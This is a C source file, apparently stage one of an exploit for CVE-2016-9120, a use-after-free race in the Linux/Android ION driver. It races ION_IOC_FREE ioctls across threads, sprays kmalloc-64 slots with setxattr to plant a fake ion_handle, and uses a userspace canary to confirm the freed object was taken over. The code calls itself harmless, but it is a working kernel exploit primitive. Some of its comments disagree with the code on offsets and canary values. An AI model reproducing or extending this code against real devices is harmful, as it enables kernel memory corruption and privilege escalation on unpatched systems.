#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#include <linux/limits.h>

/* Stage A -- harmless UAF landing detector for CVE-2016-9120 on this device.
 *
 * Race: N threads each do ONE ION_IOC_FREE on the same handle id.
 *   handle ref starts at 1; each racing thread adds +1 via get_by_id then does
 *   two puts, so when >=2 threads get past validation the put count exceeds the
 *   refs -> ion_handle_destroy() kfree()s the handle while other threads still
 *   kref_put it. That stray put lands on whatever reuses the kmalloc-64 slot.
 *
 * Spray: setxattr() with a 64-byte value -> fs/xattr.c does kmalloc(64)+
 *   copy_from_user, so the object content is ours starting at offset 0.
 *   Fake ion_handle:  ref=1, client=user zero page, buffer=user page (ref 0 so
 *   ion_buffer_put does nothing), node.parent = OUR USER PAGE with color RED
 *   and both children NULL -> rb_erase's __rb_change_child writes 0 into
 *   parent->rb_right == page+16. All kernel writes land in our own userspace.
 *
 * Hit detector: page[16] was 0xdeadbeef, becomes 0 => the UAF was consumed.
 */
#define H_REF      0x00
#define H_CLIENT   0x08
#define H_BUFFER   0x10
#define H_NODE     0x18   /* __rb_parent_color, rb_right(+8), rb_left(+0x10) */
#define H_ID       0x30
#define H_KMAPCNT  0x34
#define OBJ_SZ     64

#define ION_ALLOC  0xc0204900u
#define ION_FREE   0xc0044901u
#define ION_SHARE  0xc0084904u

struct alloc_data { unsigned long long len, align; unsigned mask, flags; unsigned handle; unsigned pad; };
struct fd_data { unsigned handle; int fd; };

static int g_ionfd;
static volatile unsigned g_id, g_go, g_ready, g_done;
static int g_nracer = 4;
static volatile int g_stop;
static char g_path[PATH_MAX], g_xname[32] = "user.v";
static unsigned char g_tmpl[OBJ_SZ];
static volatile unsigned long g_pages[32];
static unsigned long *g_up[32];

static void *racer(void *a)
{
    long me = (long)a;
    unsigned id = g_id;
    int r;
    g_ready++;
    while (!g_go)
        sched_yield();
    errno = 0;
    r = ioctl(g_ionfd, ION_FREE, &id);
    if (r && (errno != EINVAL))
        printf("  racer%ld: FREE rc=%d errno=%d\n", me, r, errno);
    g_done++;
    return NULL;
}

/* sprayer: keeps kmalloc-64 slots busy with our 64-byte template */
static void *sprayer(void *a)
{
    long me = (long)a;
    int i;
    while (!g_stop) {
        for (i = 0; i < 64; i++) {
            if (g_stop)
                break;
            setxattr(g_path, g_xname, g_tmpl, OBJ_SZ, 0);
        }
        sched_yield();
    }
    return NULL;
}

int main(int argc, char **argv)
{
    int attempts = argc > 1 ? atoi(argv[1]) : 1000;
    int i, j, hits = 0, fd;
    pthread_t th[64];

    snprintf(g_path, sizeof g_path, "%s", argc > 2 ? argv[2] : "/data/local/tmp/uaf_spray_file");
    fd = open(g_path, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("open probe file"); return 1; }
    close(fd);
    if (setxattr(g_path, g_xname, g_tmpl, OBJ_SZ, 0) && errno == EACCES) {
        printf("setxattr denied by policy (%s) -- try another path\n", strerror(errno));
        return 2;
    }
    removexattr(g_path, g_xname);

    /* user pages: one per racer guess, plus the client page */
    for (i = 0; i < 32; i++) {
        g_up[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (g_up[i] == MAP_FAILED) { perror("mmap"); return 1; }
        memset(g_up[i], 0, 4096);
    }

    g_ionfd = open("/dev/ion", O_RDONLY);
    if (g_ionfd < 0) { perror("open /dev/ion"); return 1; }

    unsigned long target = (unsigned long)g_up[0];      /* rb_erase will zero *(target+16) */
    *(unsigned long *)((char *)g_up[0] + 0)  = 0x11112222UL;   /* rb_left slot (compared, not written) */
    *(unsigned long *)((char *)g_up[0] + 16) = 0xdeadbeefUL;   /* rb_right slot: the canary */
    *(unsigned long *)((char *)g_up[0] + 8)  = 0;
    memset(g_tmpl, 0, sizeof g_tmpl);
    *(unsigned int *)(g_tmpl + H_REF) = 1;                       /* kref -> 0 -> destroy */
    *(unsigned long *)(g_tmpl + H_CLIENT) = (unsigned long)g_up[1];
    *(unsigned long *)(g_tmpl + H_BUFFER) = (unsigned long)g_up[2];
    *(unsigned long *)(g_tmpl + H_NODE) = target | 1;             /* parent=RED, no rebalance */
    *(unsigned long *)(g_tmpl + H_NODE + 8) = 0;                  /* rb_right */
    *(unsigned long *)(g_tmpl + H_NODE + 16) = 0;                  /* rb_left  */
    *(unsigned int *)(g_tmpl + H_ID) = 1;
    *(unsigned int *)(g_tmpl + H_KMAPCNT) = 0;
    /* buffer page: ref=0 so ion_buffer_put decrements to -1 and stops */
    *(unsigned int *)(g_up[2]) = 0;

    printf("target write slot: up0+32 = %p (expect it stays 0xdeadbeef unless hit)\n",
           (void *)((char *)g_up[0] + 16));
    printf("parent = %p -> rb_right slot = %p (preloaded 0xfeedface)\n",
           (void *)target, (void *)(target + 16));

    int nsp = 12;
    for (i = 0; i < nsp; i++)
        pthread_create(&th[i], NULL, sprayer, (void *)(long)i);

    for (i = 0; i < attempts && !hits; i++) {
        struct alloc_data ad;
        struct fd_data sd;
        int sfd;

        memset(&ad, 0, sizeof ad);
        ad.len = 0x1000; ad.align = 4096; ad.mask = 1u << 9;
        errno = 0;
        if (ioctl(g_ionfd, ION_ALLOC, &ad)) { printf("alloc errno=%d\n", errno); break; }
        memset(&sd, 0, sizeof sd); sd.handle = ad.handle;
        errno = 0;
        if (ioctl(g_ionfd, ION_SHARE, &sd)) { printf("share errno=%d\n", errno); break; }
        sfd = sd.fd;

        /* re-arm the canary */
        *(unsigned long *)((char *)g_up[0] + 16) = 0xdeadbeefUL;   /* re-arm canary */

        g_id = ad.handle;
        g_go = 0; g_ready = 0; g_done = 0;
        for (j = 0; j < g_nracer; j++)
            pthread_create(&th[nsp + j], NULL, racer, (void *)(long)j);
        while (g_ready < (unsigned)g_nracer)
            sched_yield();
        g_go = 1;
        while (g_done < (unsigned)g_nracer)
            sched_yield();
        for (j = 0; j < g_nracer; j++)
            pthread_join(th[nsp + j], NULL);

        close(sfd);              /* ion_dma_buf_release -> ion_buffer_put (safe here) */
        if (*(unsigned long *)((char *)g_up[0] + 16) == 0) {
            hits++;
            printf("\n*** HIT at attempt %d: parent->rb_right was zeroed => fake handle used\n", i);
            printf("    canary up0+16 = 0 (was 0xdeadbeef)\n");
        }
    }

    g_stop = 1;
    for (i = 0; i < nsp; i++)
        pthread_join(th[i], NULL);
    printf("\nattempts=%d hits=%d\n", i, hits);
    if (!hits)
        printf("no landing: raise racers/sprayers, or the window never opened "
               "(check dmesg for invalid-handle WARN)\n");
    close(g_ionfd);
    return hits ? 0 : 3;
}
